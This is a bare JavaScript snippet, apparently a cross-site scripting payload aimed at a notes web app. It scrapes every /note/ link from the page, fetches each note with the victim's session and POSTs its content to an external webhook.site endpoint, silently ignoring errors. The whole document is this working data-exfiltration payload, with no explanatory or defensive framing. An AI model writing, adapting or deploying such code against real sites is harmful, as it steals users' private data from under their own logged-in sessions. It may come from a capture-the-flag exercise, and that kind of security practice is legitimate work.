fetch('/')
  .then(r => r.text())
  .then(html => {
    const ids = [...html.matchAll(/\/note\/[a-f0-9-]{36}/g)].map(x => x[0]);
    
    let i = 0;
    const sendNext = async () => {
      if (i >= ids.length) return;
      const path = ids[i++];
      try {
        const res = await fetch(path);
        const content = await res.text();
        await fetch('https://webhook.site/2d3e4491-068d-477a-b643-9baf8c75b936', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: path, content })
        });
      } catch (e) {}
      sendNext(); // Proceed to next
    };

    sendNext();
  });
